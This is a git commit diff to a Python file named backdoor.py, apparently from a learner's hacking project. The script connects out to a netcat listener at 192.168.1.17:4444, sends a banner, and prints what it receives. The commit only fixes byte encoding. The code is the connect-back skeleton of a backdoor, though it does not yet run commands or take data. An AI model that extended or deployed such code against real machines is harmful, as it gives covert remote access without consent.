2dbbf55a376fdd9ffadefbc0319fbea1b2f23c40
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-04 04:15:51 -0400

    simple send recv data program

--- backdoor.py
+++ backdoor.py
@@ -4,9 +4,13 @@ import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.17", 4444))
 
-s.send("\n[+] Connection Successful!!!\n")
+s.send(b"\n[+] Connection Successful!!!\n")
 recved_data = s.recv(1024)
-print(recved_data)
+try:
+    print(recved_data.decode("utf-8"))
+except:
+    print(recved_data)
+
 s.close()
 '''
 In 192.168.1.17 we listen for incoming connections using netcat
